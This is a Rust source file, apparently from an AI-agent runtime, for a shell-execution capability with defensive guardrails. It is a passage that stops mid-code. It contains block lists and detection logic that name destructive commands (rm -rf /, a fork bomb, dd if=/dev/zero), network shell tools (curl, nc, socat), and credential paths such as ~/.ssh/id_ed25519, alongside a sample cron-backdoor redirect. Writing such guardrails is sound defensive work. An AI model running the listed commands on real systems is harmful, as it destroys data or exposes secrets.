//! ShellExec capability — execute shell commands with full telemetry and audit trail.
//!
//! All commands execute via `sh -c`, providing full shell functionality:
//! - Pipes: `ls | head -5`
//! - Redirects: `echo hello > /tmp/file.txt`
//! - Chaining: `echo first && echo second`
//!
//! # Guardrails (not security)
//!
//! **Threat model:** Agents making mistakes, not attackers.
//! The blocklist catches obvious agent hallucinations/bugs.
//!
//! **What's blocked:**
//! - Filesystem destruction: `rm` (all forms), `rm -rf /`, `rm --recursive`, `rm --no-preserve-root`
//! - Secure deletion: `shred` (use FileWrite/Undo instead)
//! - Fork bombs: `:(){ :|:& };:` and variants (self-referencing function definitions)
//! - Shell expansion bypasses: `rm -rf ~` (tilde expansion)
//! - Filesystem creation: `mkfs.*`, `mkswap`
//! - Data destruction: `dd if=/dev/zero`
//! - System commands: `shutdown`, `reboot`, `poweroff`
//! - Disk operations: `fdisk`, `parted`
//! - Permission/ownership changes: `chown`, `chgrp`, `chmod`
//! - Mount operations: `mount`, `umount`
//! - Firewall manipulation: `iptables`, `nft`
//! - Process termination: `kill`, `killall`, `pkill` (use Kill capability instead)
//! - Shell builtins: `eval`, `exec`, `source`, `.` (arbitrary code execution)
//! - Interpreters: `python`, `perl`, `ruby`, `node`, `lua`, etc. (opt-in via `RUNTIMO_ENABLE_INTERPRETERS`)
//! - Outbound network tools: `curl`, `wget`, `nc`, `ncat`, `socat`, `ssh`, `scp`, `telnet`
//!   (gated behind `RUNTIMO_ENABLE_NETWORK=1` env var)
//!
//! **PATH sanitization:**
//! ShellExec sets `PATH=/usr/local/bin:/usr/bin:/bin` to limit
//! which executables the command can invoke. Custom binaries
//! in non-standard locations are not resolvable.
//!
//! **What protects you:**
//! - Dangerous command blocklist
//! - Network command gating (opt-in via `RUNTIMO_ENABLE_NETWORK`)
//! - PATH sanitization to known-safe directories
//! - Resource limits (timeout, process isolation)
//! - WAL audit trail (supports undo/recovery)
//!
//! # Features
//!
//! - Timeout enforcement (default 30s, configurable)
//! - Output capture (stdout/stderr, bounded to 10MB)
//! - PID tracking (child PID only; spawned_pids removed from output)
//! - Process group isolation (kills all descendants on timeout)
//! - Telemetry before/after execution
//! - WAL logging for audit trail
//! - Stdin pipe support
//!
//! # Example
//!
//! ```rust,ignore
//! use runtimo_core::capabilities::ShellExec;
//! use runtimo_core::capability::{Capability, Context};
//! use serde_json::json;
//!
//! let result = ShellExec.execute(
//!     &json!({"cmd": "ls | head -5", "timeout_secs": 10}),
//!     &Context { dry_run: false, job_id: "test".into(), working_dir: std::env::temp_dir() }
//! ).unwrap();
//! ```

use crate::capability::{CapabilityError, Context, Output, TypedCapability};
use crate::config::RuntimoConfig;
use crate::validation::path::{validate_path, PathContext};
use crate::{Error, Result};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::fs;
use std::io::{Read, Write};
use std::os::unix::process::CommandExt;
use std::process::{Child, Command, ExitStatus};
use std::thread;
use std::time::{Duration, Instant};

type WaitResult = Result<(ExitStatus, Vec<u8>, Vec<u8>, Vec<u32>)>;

const DEFAULT_TIMEOUT_SECS: u64 = 30;
const MAX_OUTPUT_BYTES: usize = 10 * 1024 * 1024;
const MAX_STDIN_BYTES: usize = 1024 * 1024;

/// Sensitive environment variable prefixes to strip before shell execution.
///
/// `_KEY`, `_TOKEN`, `_SECRET`, and `_PASSWORD` are checked as suffixes
/// on the uppercased key name to catch `API_KEY`, `GITHUB_TOKEN`, etc.
/// The prefix-based and suffix-based lists cover the most common patterns.
/// GAP-07: This is prefix/suffix-based, not regex. Pattern variants
/// like `MYPRIVATEKEY` (no underscore) are not caught.
const SENSITIVE_ENV_PREFIXES: &[&str] = &[
    "RUSTIMO_",
    "AWS_",
    "GITHUB_",
    "GITLAB_",
    "SSH_",
    "GPG_",
    "DOCKER_",
    "VAULT_",
    "NOMAD_",
    "CONSUL_",
    "HEROKU_",
    "AZURE_",
    "GCLOUD_",
    "GOOGLE_CLOUD",
    "GOOGLE_APPLICATION",
    "SENTRY_DSN",
    "DATADOG_",
    "NEW_RELIC_",
    "STRIPE_",
    "TWILIO_",
    "SENDGRID_",
    "MAILGUN_",
    "LDAP_",
    "KRB5_",
    "CUDA_", // CUDA_VISIBLE_DEVICES is non-secret but kept for defense-in-depth
    // GAP-15: Dynamic linker attack surface — these control shared library
    // loading and can inject arbitrary code into any spawned process.
    "LD_",
    "DYLD_",
];

const SENSITIVE_ENV_SUFFIXES: &[&str] = &[
    "_KEY",
    "_TOKEN",
    "_SECRET",
    "_PASSWORD",
    "_SECRETS",
    "_CREDENTIAL",
    "_CREDENTIALS",
    "_CERT",
    "_CERTIFICATE",
    "_PRIVATE_KEY",
    "_ACCESS_KEY",
    "_SECRET_KEY",
    "_SIGNING_KEY",
    "_ENCRYPTION_KEY",
    "_DECRYPTION_KEY",
    "_API_KEY",
    "_AUTH_TOKEN",
    "_DSN",
    "_URL",
];

/// Safe environment variables to preserve during shell execution.
const SAFE_ENV_VARS: &[&str] = &[
    "HOME",
    "USER",
    "LOGNAME",
    "PATH",
    "TERM",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    "PWD",
    "OLDPWD",
    "SHELL",
    "EDITOR",
    "VISUAL",
    "DISPLAY",
    "XAUTHORITY",
    "WAYLAND_DISPLAY",
    "DBUS_SESSION_BUS_ADDRESS",
    "XDG_RUNTIME_DIR",
    "XDG_SESSION_TYPE",
    "XDG_CURRENT_DESKTOP",
    "XDG_CONFIG_HOME",
    "XDG_DATA_HOME",
    "XDG_CACHE_HOME",
    "COLORTERM",
    "NO_COLOR",
    "CLICOLOR",
    "HOSTNAME",
    "HOST",
    "MACHTYPE",
    "OSTYPE",
    "SHLVL",
    "LINENO",
    "PPID",
    "EUID",
    "UID",
    // Runtimo's own env vars are allowed for opt-in features
    "RUNTIMO_ENABLE_NETWORK",
    "RUNTIMO_ENABLE_INTERPRETERS",
    // GAP-07: Known non-secret vars that could accidentally match suffix patterns.
    // These are real environment variables used by tools/frameworks that happen
    // to end in `_KEY` or `_URL` but do NOT contain secrets.
    "FOREIGN_KEY",
    "PRIMARY_KEY",
    "PUBLIC_KEY",
    "BROWSER_URL",
    "BASE_URL",
];

/// Input parameters for [`ShellExec::execute`].
///
/// Runs a shell command with an optional timeout and working directory.
/// Dangerous commands (rm -rf /, dd, fork bombs) are rejected before execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(clippy::exhaustive_structs)] // args struct — fields are the contract
pub struct ShellExecArgs {
    /// Shell command to execute (e.g. `"ls -la"`, `"cargo build"`).
    #[serde(alias = "command")]
    pub cmd: String,
    /// Maximum seconds before the process is killed (default: 30).
    pub timeout_secs: Option<u64>,
    /// Working directory for the command (default: executor CWD).
    pub cwd: Option<String>,
    /// Data piped to the command's stdin.
    pub stdin: Option<String>,
}

/// Tests whether a command prefix (first whitespace-delimited token) matches
/// any entry in the given list. Avoids false-positives from substrings
/// (e.g. "ssh" in "ssh-agent" is fine when `ssh` is a prefix match but not
/// when it appears mid-word).
fn command_matches(cmd_lower: &str, names: &[&str]) -> bool {
    let first_token = cmd_lower.split_whitespace().next().unwrap_or("");
    // Also check for pipe/chaining context: `echo foo | curl ...` or `true && curl ...`
    for part in cmd_lower.split(['|', '&', ';']) {
        let t = part.trim();
        if names
            .iter()
            .any(|n| t == *n || t.starts_with(&format!("{} ", n)))
        {
            return true;
        }
    }
    names.contains(&first_token)
}

/// Checks whether a command is inherently dangerous and must be blocked.
///
/// This is the primary blocklist gate. It checks both the original command
/// and a detokenized version (to catch shell-quoting bypasses like `r"m"`).
///
/// # Categories blocked
///
/// - **Env dumpers:** `env`, `printenv`, `set`, `export`, `declare`, etc.
/// - **Fork bombs:** `:(){ :|:& };:` and self-referencing function definitions
/// - **Heredocs/herestrings:** `<<`, `<<<` (multi-line content bypasses single-line checks)
/// - **Process substitution:** `<(cmd)`, `>(cmd)`
/// - **Command substitution:** `$(cmd)`, `` `cmd` ``
/// - **rm:** All forms (`rm /tmp/file`, `rm -rf /`, `r"m" /etc/passwd`)
/// - **Filesystem:** `mkfs`, `mkswap`, `fdisk`, `parted`
/// - **Data destruction:** `dd`, `shred`
/// - **System:** `shutdown`, `reboot`, `poweroff`
/// - **Ownership/permissions:** `chown`, `chgrp`, `chmod`
/// - **Mount:** `mount`, `umount`
/// - **Firewall:** `iptables`, `nft`
/// - **Process termination:** `kill`, `killall`, `pkill`
#[must_use]
pub fn is_dangerous_command(cmd: &str) -> Option<&'static str> {
    let cmd_lower = cmd.to_lowercase();
    // Also check the detokenized version to catch shell-quoting bypasses
    // (F-013: `r"m" -rf /` is detokenized to `rm -rf /` for substring matching)
    let detok_lower = detokenize_command(&cmd_lower);

    // ── F-015: Block env-dumping commands before other checks ──
    // These expose all environment variables including secrets.
    if is_env_dumping_command(cmd) {
        return Some("environment variable dumping command is blocked");
    }

    // ── N-004: Fork bomb detection ──
    // Fork bombs use shell function definitions that self-recurse via pipe.
    // The canonical form is `:(){ :|:& };:` but variants exist with spaces
    // and without semicolons. Detection requires both the function definition
    // syntax `:(){` (or `:() {`) and the self-referencing pipe `:|:&` (or
    // `:|: &`). The standalone `:` builtin is harmless — only the function
    // definition pattern is dangerous.
    {
        let has_func_def = cmd_lower.contains(":(){")
            || cmd_lower.contains(":(){ ")
            || cmd_lower.contains(":() {")
            || detok_lower.contains(":(){")
            || detok_lower.contains(":(){ ")
            || detok_lower.contains(":() {");
        let has_self_pipe = cmd_lower.contains(":|:&")
            || cmd_lower.contains(":|: &")
            || detok_lower.contains(":|:&")
            || detok_lower.contains(":|: &");
        if has_func_def && has_self_pipe {
            return Some("fork bomb pattern blocked");
        }
    }

    // ── GAP-03: Heredoc/herestring detection ──
    // << opens a heredoc; <<< is a herestring. Both allow multi-line
    // content that bypasses single-line blocklist substring checks.
    // The content following << could contain any dangerous command
    // spread across multiple lines.
    if cmd_lower.contains("<<") || detok_lower.contains("<<") {
        return Some("heredoc/herestring (<<) is blocked — use inline commands");
    }

    // ── GAP-04: Process substitution detection ──
    // <(cmd) creates an input named pipe; >(cmd) creates an output named pipe.
    // Both allow command execution that bypasses path checks and blocklist
    // substring checks. Block them entirely.
    if cmd_lower.contains("<(")
        || cmd_lower.contains(">(")
        || detok_lower.contains("<(")
        || detok_lower.contains(">(")
    {
        return Some("process substitution (<( ) or >( )) is blocked");
    }

    // ── GAP-05: Command substitution detection ──
    // $(cmd) and `cmd` are command substitutions that execute at runtime.
    // Static analysis cannot determine what they produce, so they must be
    // blocked — a harmless-looking $(echo hello) could become dangerous
    // through environment variables or argument injection.
    if cmd.contains("$(")
        || cmd.contains('`')
        || detok_lower.contains("$(")
        || detok_lower.contains('`')
    {
        return Some("command substitution ($( ) or backtick) is blocked");
    }

    // ── N-007: Block bare `rm` regardless of flags ──
    // All `rm` usage is blocked. The shell provides `help` builtin for
    // documentation. This catches `rm /tmp/file`, `rm -rf /`, `r"m" /tmp/x`,
    // and all detokenized variants. Placed BEFORE the existing rm checks so
    // that both the simple `rm` and the flag-variant checks are redundant
    // but defense-in-depth.
    if command_matches(&cmd_lower, &["rm"]) || command_matches(&detok_lower, &["rm"]) {
        return Some("rm command blocked — use FileWrite/Undo capability");
    }

    // rm --no-preserve-root is always blocked — bypasses root safety guard
    let rm_no_preserve = "rm".to_string() + " --no-preserve-root";
    if (cmd_lower.contains("rm") && cmd_lower.contains("--no-preserve-root"))
        || (detok_lower.contains("rm") && detok_lower.contains("--no-preserve-root"))
        || detok_lower.contains(&rm_no_preserve)
    {
        return Some("rm --no-preserve-root is blocked");
    }

    // rm with recursive/destructive flags is always blocked
    // Catches: rm -rf /, rm -fr /*, rm --recursive /, rm -r -f /, etc.
    // F-013: Check both original and detokenized to catch r"m" -rf /
    let rm_recursive_check = |s: &str| -> bool {
        s.contains("rm")
            && (s.contains("-rf")
                || s.contains("-fr")
                || s.contains("--recursive")
                || s.contains(" -r ")
                || s.contains(" -f "))
    };

    if rm_recursive_check(&cmd_lower) || rm_recursive_check(&detok_lower) {
        return Some("recursive rm is blocked");
    }

    let mkfs_check = |s: &str| -> bool { s.contains("mkfs") || s.contains("mkswap") };
    if mkfs_check(&cmd_lower) || mkfs_check(&detok_lower) {
        return Some("filesystem creation commands are blocked");
    }

    let fdisk_check = |s: &str| -> bool { s.contains("fdisk") || s.contains("parted") };
    if fdisk_check(&cmd_lower) || fdisk_check(&detok_lower) {
        return Some("disk partitioning commands are blocked");
    }

    let dd_check = |s: &str| -> bool {
        s.contains(" dd ")
            || s.starts_with("dd ")
            || s.ends_with(" dd")
            || s.contains(" dd\t")
            || s.starts_with("dd\t")
    };
    if dd_check(&cmd_lower) || dd_check(&detok_lower) {
        return Some("dd (disk destroyer) is blocked");
    }

    // N-001: shred — secure file deletion (overwrites before unlinking)
    // Blocks: `shred -u /tmp/file`, `shred -vfz /tmp/file`, etc.
    // Same pattern as chown/chgrp — prefix-matched to avoid false positives
    // on filenames containing "shred" as a substring.
    if command_matches(&cmd_lower, &["shred"]) || command_matches(&detok_lower, &["shred"]) {
        return Some("shred command blocked — use FileWrite/Undo capability");
    }

    let power_check = |s: &str| -> bool {
        s.contains("shutdown") || s.contains("reboot") || s.contains("poweroff")
    };
    if power_check(&cmd_lower) || power_check(&detok_lower) {
        return Some("system power commands are blocked");
    }

    // chown/chgrp — ownership changes (check both original and detokenized)
    if command_matches(&cmd_lower, &["chown", "chgrp"])
        || command_matches(&detok_lower, &["chown", "chgrp"])
    {
        return Some("ownership change commands are blocked");
    }

    // mount/umount — filesystem mount operations
    if command_matches(&cmd_lower, &["mount", "umount"])
        || command_matches(&detok_lower, &["mount", "umount"])
    {
        return Some("mount/unmount commands are blocked");
    }

    // iptables/nft — firewall manipulation
    if command_matches(&cmd_lower, &["iptables", "nft"])
        || command_matches(&detok_lower, &["iptables", "nft"])
    {
        return Some("firewall manipulation commands are blocked");
    }

    // N-005: kill — process termination
    // Blocks: `kill -9 1234`, `killall`, `kill -TERM`, etc.
    // Agents should use the Kill capability for process management, which
    // enforces PID validation and audit trail. Shell-level kill bypasses
    // those protections.
    if command_matches(&cmd_lower, &["kill", "killall", "pkill"])
        || command_matches(&detok_lower, &["kill", "killall", "pkill"])
    {
        return Some("kill command blocked — use Kill capability");
    }

    // eval, exec, source, . — shell builtins for arbitrary code execution
    // These bypass the blocklist by loading and executing arbitrary commands
    // at runtime. eval re-parses its arguments as shell code; exec replaces
    // the current process; source/. loads a script file into the shell.
    if command_matches(&cmd_lower, &["eval", "exec", "source", "."])
        || command_matches(&detok_lower, &["eval", "exec", "source", "."])
    {
        return Some("shell builtins (eval/exec/source/.) are blocked");
    }

    // rm -rf on system directories (check both)
    let rm_system_check = |s: &str| -> bool {
        s.contains("rm")
            && (s.contains("-rf")
                || s.contains("-fr")
                || s.contains("--recursive")
                || s.contains(" -r ")
                || s.contains(" -f "))
            && (s.contains(" / ")
                || s.contains("/*")
                || s.contains("/dev")
                || s.contains("/boot")
                || s.contains("/home")
                || s.contains("/etc")
                || s.contains("/usr")
                || s.contains("/var")
                || s.contains("/lib")
                || s.contains("/opt")
                || s.contains("/bin")
                || s.contains("/sbin"))
    };
    if rm_system_check(&cmd_lower) || rm_system_check(&detok_lower) {
        return Some("rm -rf / --recursive on system directories is blocked");
    }

    // rm with tilde expansion (check both)
    let rm_tilde_check = |s: &str| -> bool {
        s.contains("rm")
            && (s.contains("-rf")
                || s.contains("-fr")
                || s.contains("--recursive")
                || s.contains(" -r ")
                || s.contains(" -f "))
            && s.contains('~')
    };
    if rm_tilde_check(&cmd_lower) || rm_tilde_check(&detok_lower) {
        return Some("rm with shell expansions is blocked — use explicit paths");
    }

    // N-019: chmod — permission changes (check both original and detokenized)
    // Broadened from the previous triple-condition (chmod + 777 + " /") to
    // block ALL chmod invocations. Agents should use FileWrite/Undo for
    // permission management, which enforces path validation and audit trail.
    if command_matches(&cmd_lower, &["chmod"]) || command_matches(&detok_lower, &["chmod"]) {
        return Some("chmod command blocked — use FileWrite/Undo capability");
    }

    // ── Config-based blocklist overrides ──
    // Additional patterns from `~/.config/runtimo/config.toml` [blocklist_overrides].
    // These are merged on top of the built-in blocklist for site-specific policy.
    let overrides = crate::config::RuntimoConfig::get_blocklist_overrides();
    for pattern in &overrides {
        if !pattern.is_empty()
            && (cmd_lower.contains(pattern.as_str()) || detok_lower.contains(pattern.as_str()))
        {
            return Some("command blocked by config override");
        }
    }

    None
}

/// Tests whether a command invokes a network client.
///
/// Blocked tools: `curl`, `wget`, `nc`/`ncat`/`netcat`, `socat`,
/// `ssh`, `scp`, `telnet`.
///
/// These are only blocked when `RUNTIMO_ENABLE_NETWORK` is not set to `"1"`.
#[must_use]
pub fn is_network_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();
    command_matches(
        &cmd_lower,
        &[
            "curl", "wget", "nc", "ncat", "netcat", "socat", "ssh", "scp", "telnet",
        ],
    )
}

/// Checks whether outbound network commands are permitted.
///
/// Returns `true` when network tools are allowed (env var set to `"1"`).
#[must_use]
pub fn network_enabled() -> bool {
    std::env::var("RUNTIMO_ENABLE_NETWORK").as_deref() == Ok("1")
}

/// Tests whether a command invokes a scripting language interpreter.
///
/// Blocked tools: `python`, `python3`, `perl`, `ruby`, `node`, `lua`,
/// `php`, `tclsh`, `wish`, `racket`, `guile`, `ghci`, `runghc`, `scala`,
/// `gawk`, `nawk`.
///
/// Interpreters can execute arbitrary code including filesystem manipulation,
/// network access, and process spawning — bypassing all blocklist protections.
/// They are gated behind `RUNTIMO_ENABLE_INTERPRETERS=1`.
#[must_use]
pub fn is_interpreter_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();
    command_matches(
        &cmd_lower,
        &[
            "python", "python3", "python2", "perl", "ruby", "node", "lua", "php", "tclsh", "wish",
            "racket", "guile", "ghci", "runghc", "scala", "gawk", "nawk",
        ],
    )
}

/// Checks whether interpreter commands are permitted.
///
/// Returns `true` when interpreters are allowed (env var set to `"1"`).
/// Default is blocked — agents should use ShellExec for shell commands,
/// not arbitrary interpreter invocations.
#[must_use]
pub fn interpreters_enabled() -> bool {
    std::env::var("RUNTIMO_ENABLE_INTERPRETERS").as_deref() == Ok("1")
}

// ── F-013: Shell detokenizer ──────────────────────────────────────────────

/// # Multi-pass detokenization (GAP-02)
///
/// This function runs detokenization repeatedly until the output stabilizes.
/// This handles nested/complex quoting patterns that survive a single pass:
/// - `r""m""` → pass 1: `rm` → stable (already handled by single pass)
/// - Mixed ANSI-C + double-quote nesting: handled by repeat
/// - Backslash-newline line continuations: removed in first pass
///
/// Each pass strips one layer of quoting; the loop terminates when no
/// further changes are detected or after 16 passes (safety limit).
#[must_use]
pub fn detokenize_command(cmd: &str) -> String {
    const MAX_PASSES: usize = 16;

    let mut current = cmd.to_string();
    let mut previous;
    let mut passes: usize = 0;

    loop {
        previous = current.clone();
        current = detokenize_single_pass(&previous);
        passes = passes.saturating_add(1);
        if current == previous || passes >= MAX_PASSES {
            break;
        }
    }
    current
}

/// Single-pass detokenizer — strips one layer of shell quoting.
///
/// See [`detokenize_command`] for the multi-pass wrapper.
#[must_use]
fn detokenize_single_pass(cmd: &str) -> String {
    let mut result = String::with_capacity(cmd.len());
    let mut chars = cmd.chars().peekable();

    while let Some(&c) = chars.peek() {
        match c {
            '\\' => {
                // Backslash escape: skip the backslash
                chars.next(); // consume backslash
                if let Some(next) = chars.next() {
                    // GAP-02: backslash-newline is a line continuation —
                    // both the backslash and newline are removed in POSIX sh.
                    // Emit nothing so tokens on either side rejoin.
                    if next != '\n' {
                        result.push(next);
                    }
                }
                // If backslash is last char, it just disappears
            }
            '$' => {
                // Check for ANSI-C quoting: $'...' (GAP-01, GAP-06)
                // Peek at the next character without consuming $
                chars.next(); // consume $
                if chars.peek() == Some(&'\'') {
                    chars.next(); // consume the opening '
                                  // Process ANSI-C quoted string until closing '
                    while let Some(ch) = chars.next() {
                        if ch == '\'' {
                            break; // closing quote
                        }
                        if ch == '\\' {
                            // ANSI-C escape sequence — expand to literal
                            match chars.next() {
                                Some('\\') => result.push('\\'),
                                Some('\'') => result.push('\''),
                                Some('"') => result.push('"'),
                                Some('?') => result.push('?'),
                                Some('a') => result.push('a'),
                                Some('b') => result.push('b'),
                                Some('f') => result.push('f'),
                                Some('n' | 'r' | 't' | 'v') => {
                                    // whitespace escapes → space for token visibility
                                    result.push(' ');
                                }
                                Some('e' | 'E') => result.push('e'),
                                // \xHH — hex escape (up to 2 hex digits)
                                Some('x') => {
                                    let mut hex = String::new();
                                    for _ in 0..2 {
                                        if let Some(&h) = chars.peek() {
                                            if h.is_ascii_hexdigit() {
                                                hex.push(h);
                                                chars.next();
                                            } else {
                                                break;
                                            }
                                        }
                                    }
                                    if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                                        if let Some(c) = char::from_u32(u32::from(byte)) {
                                            result.push(c);
                                        }
                                    }
                                }
                                // \uHHHH — 16-bit unicode escape
                                Some('u') => {
                                    let mut hex = String::new();
                                    for _ in 0..4 {
                                        if let Some(&h) = chars.peek() {
                                            if h.is_ascii_hexdigit() {
                                                hex.push(h);
                                                chars.next();
                                            } else {
                                                break;
                                            }
                                        }
                                    }
                                    if let Ok(cp) = u32::from_str_radix(&hex, 16) {
                                        if let Some(c) = char::from_u32(cp) {
                                            result.push(c);
                                        }
                                    }
                                }
                                // \UHHHHHHHH — 32-bit unicode escape
                                Some('U') => {
                                    let mut hex = String::new();
                                    for _ in 0..8 {
                                        if let Some(&h) = chars.peek() {
                                            if h.is_ascii_hexdigit() {
                                                hex.push(h);
                                                chars.next();
                                            } else {
                                                break;
                                            }
                                        }
                                    }
                                    if let Ok(cp) = u32::from_str_radix(&hex, 16) {
                                        if let Some(c) = char::from_u32(cp) {
                                            result.push(c);
                                        }
                                    }
                                }
                                // \NNN — octal escape (1-3 octal digits)
                                Some(d) if ('0'..='7').contains(&d) => {
                                    let mut octal = String::from(d);
                                    for _ in 0..2 {
                                        if let Some(&od) = chars.peek() {
                                            if ('0'..='7').contains(&od) {
                                                octal.push(od);
                                                chars.next();
                                            } else {
                                                break;
                                            }
                                        }
                                    }
                                    if let Ok(byte) = u8::from_str_radix(&octal, 8) {
                                        if let Some(c) = char::from_u32(u32::from(byte)) {
                                            result.push(c);
                                        }
                                    }
                                }
                                // \cX — control character (output X for visibility)
                                Some(ctrl) => result.push(ctrl),
                                // lone backslash at end of string: drop it
                                None => {}
                            }
                        } else {
                            result.push(ch);
                        }
                    }
                } else {
                    // Not ANSI-C quoting, emit $ as regular character
                    result.push('$');
                }
            }
            '\'' => {
                // Single-quoted string: everything literal until closing '
                chars.next(); // consume opening quote
                for ch in chars.by_ref() {
                    if ch == '\'' {
                        break; // closing quote consumed, don't emit
                    }
                    result.push(ch);
                }
            }
            '"' => {
                // Double-quoted string: backslash escapes for "$`\ and newline
                chars.next(); // consume opening quote
                while let Some(ch) = chars.next() {
                    if ch == '"' {
                        break; // closing quote
                    }
                    if ch == '\\' {
                        if let Some(&next_ch) = chars.peek() {
                            match next_ch {
                                '"' | '$' | '`' | '\\' | '\n' => {
                                    chars.next(); // consume backslash
                                    result.push(next_ch);
                                    continue;
                                }
                                _ => {
                                    // Not a special escape, keep the backslash
                                    result.push('\\');
                                    // next_ch will be handled by next iteration
                                    continue;
                                }
                            }
                        }
                        // backslash at end of input, keep it
                        result.push('\\');
                        break;
                    }
                    result.push(ch);
                }
            }
            _ => {
                result.push(c);
                chars.next(); // consume
            }
        }
    }
    result
}

// ── F-015: Environment sanitization ────────────────────────────────────────

/// Returns `true` when the given environment variable name carries sensitive
/// data and should be stripped before shell execution.
///
/// Checks both prefix-based patterns (e.g. `AWS_*`) and suffix-based patterns
/// (e.g. `*_KEY`, `*_TOKEN`). The safe-list of known-safe variables overrides
/// the blocklist.
#[must_use]
fn is_sensitive_env_var(key: &str) -> bool {
    // Safe-list check first — explicit allowance overrides blocklist
    if SAFE_ENV_VARS.contains(&key) {
        return false;
    }
    let key_upper = key.to_uppercase();
    // Prefix match
    if SENSITIVE_ENV_PREFIXES
        .iter()
        .any(|prefix| key_upper.starts_with(prefix))
    {
        return true;
    }
    // Suffix match (e.g. MYAPP_API_KEY → matches _KEY)
    SENSITIVE_ENV_SUFFIXES
        .iter()
        .any(|suffix| key_upper.ends_with(suffix))
}

/// Builds a sanitized environment for shell execution.
///
/// Strips environment variables matching sensitive patterns (prefix-based
/// and suffix-based). Preserves safe system variables and Runtimo's own
/// opt-in feature flags. PATH is always set to the sanitized path
/// regardless of the incoming environment.
#[must_use]
fn sanitized_env() -> Vec<(String, String)> {
    std::env::vars()
        .filter(|(key, _)| !is_sensitive_env_var(key))
        .collect()
}

/// Returns `true` when a command dumps all environment variables.
///
/// Shell builtins that expose the full environment (possibly including
/// secrets) are flagged as dangerous. This catches:
/// - `env` / `printenv` — print all env vars
/// - `set` — shell builtin that dumps vars+functions
/// - `export` / `export -p` — print exported vars
/// - `declare -p` / `typeset -p` — bash/ksh var dump
/// - `compgen -v` — bash variable name completion
#[must_use]
pub fn is_env_dumping_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase().trim().to_string();
    // Also check the detokenized version
    let detok_lower = detokenize_command(&cmd_lower);

    let env_dumpers: &[&str] = &[
        "env", "printenv", "set", "export", "declare", "typeset", "compgen",
    ];

    for dumper in env_dumpers {
        // Check original command
        if command_matches(&cmd_lower, &[dumper]) {
            return true;
        }
        // Check detokenized version (catches "e'n'v" etc.)
        if command_matches(&detok_lower, &[dumper]) {
            return true;
        }
    }
    false
}

// ── F-014: Path-aware ShellExec ────────────────────────────────────────────

/// Checks whether a resolved path is within one of the allowed prefixes.
///
/// Uses the same prefix-matching logic as [`crate::validation::path::path_in_prefix`]
/// but operates on string paths without requiring filesystem existence.
///
/// Empty prefixes are skipped to prevent matching everything via
/// `format!("{}/", "")` which produces `"/"` — a path that matches
/// every absolute path (N-014 defense-in-depth).
#[must_use]
fn is_path_within_allowed(path_str: &str, allowed: &[String]) -> bool {
    allowed
        .iter()
        .filter(|prefix| !prefix.is_empty())
        .any(|prefix| path_str == prefix || path_str.starts_with(&format!("{}/", prefix)))
}

/// Expands `$VAR` and `${VAR}` references in a path-like token using the
/// current process environment. Returns the expanded path, or the original
/// token if no variables were found or expansion failed.
///
/// # GAP-08
///
/// This catches paths like `$HOME/.ssh/id_ed25519` and `${HOME}/.aws/credentials`
/// that would otherwise be skipped by path validation because they don't start
/// with `/` or `~/`.
#[must_use]
fn expand_shell_vars(token: &str) -> String {
    let mut result = String::with_capacity(token.len());
    let mut chars = token.chars().peekable();
    let mut expanded_any = false;

    while let Some(&c) = chars.peek() {
        if c == '$' {
            chars.next(); // consume $
                          // Check for ${VAR} syntax
            if chars.peek() == Some(&'{') {
                chars.next(); // consume {
                let mut var_name = String::new();
                while let Some(&ch) = chars.peek() {
                    if ch == '}' {
                        chars.next(); // consume }
                        break;
                    }
                    var_name.push(ch);
                    chars.next();
                }
                // Expand the variable
                if let Ok(value) = std::env::var(&var_name) {
                    result.push_str(&value);
                    expanded_any = true;
                } else {
                    // Variable not set — keep the reference as-is for blocklist
                    result.push('$');
                    result.push('{');
                    result.push_str(&var_name);
                    result.push('}');
                }
            } else {
                // $VAR syntax (no braces) — read until non-alphanumeric or _
                let mut var_name = String::new();
                while let Some(&ch) = chars.peek() {
                    if ch.is_alphanumeric() || ch == '_' {
                        var_name.push(ch);
                        chars.next();
                    } else {
                        break;
                    }
                }
                if var_name.is_empty() {
                    // Lone $ (e.g., end of string or $ followed by non-name char)
                    result.push('$');
                } else if let Ok(value) = std::env::var(&var_name) {
                    result.push_str(&value);
                    expanded_any = true;
                } else {
                    // Variable not set — keep reference
                    result.push('$');
                    result.push_str(&var_name);
                }
            }
        } else {
            result.push(c);
            chars.next();
        }
    }

    if expanded_any {
        result
    } else {
        token.to_string()
    }
}

/// Scans a shell command for path references and validates them against
/// the allowed prefixes from configuration.
///
/// # What it catches
///
/// - Absolute paths: `cat /etc/passwd`, `ls /root/.ssh/`
/// - Tilde-expanded paths: `cat ~/.ssh/id_ed25519`, `ls ~/.aws/credentials`
/// - Paths after I/O redirects: `> /etc/cron.d/evil`, `< /root/secrets`
///
/// # What it does NOT catch (GAP-09, GAP-10)
///
/// - Command substitution paths: `cat $(find /etc -name shadow)` — blocked by GAP-05
/// - Backtick paths: `` cat `/etc/passwd` `` — blocked by GAP-05
/// - Inline redirect paths: `echo evil >/etc/cron.d/backdoor` — handled by GAP-10
///
/// These are documented as GAP-09 through GAP-12 and require a shell-AST
/// based approach for comprehensive coverage.
///
/// # Returns
///
/// `None` if all detectable paths are within allowed directories.
/// `Some(reason)` with a human-readable description of the blocked path.
#[must_use]
fn check_command_paths(cmd: &str) -> Option<String> {
    let allowed = RuntimoConfig::get_allowed_prefixes();
    let detok = detokenize_command(cmd);

    // Scan each whitespace-separated token
    for token in detok.split_whitespace() {
        // Strip surrounding quotes, backticks, commas (common in arg lists)
        let path = token.trim_matches(|c: char| c == '"' || c == '\'' || c == '`' || c == ',');

        // Skip empty or non-path tokens
        if path.is_empty() || path.len() < 2 {
            continue;
        }

        // Skip "--flag" style arguments
        if path.starts_with('-') {
            continue;
        }

        // ── GAP-10: Strip I/O redirect operators ──
        // Tokens like ">/etc/cron.d/evil" have the redirect operator
        // glued to the path. Strip the operator prefix and check the
        // remaining path. Handles: > >> < 2> 1> &> 2>> &>>
        let path_without_redirect = path
            .trim_start_matches("&>>")
            .trim_start_matches("2>>")
            .trim_start_matches("1>>")
            .trim_start_matches("&>")
            .trim_start_matches("2>")
            .trim_start_matches("1>")
            .trim_start_matches(">>")
            .trim_start_matches('>')
            .trim_start_matches('<');

        // If we stripped something and the remainder starts with /, use it
        let path = if path_without_redirect != path
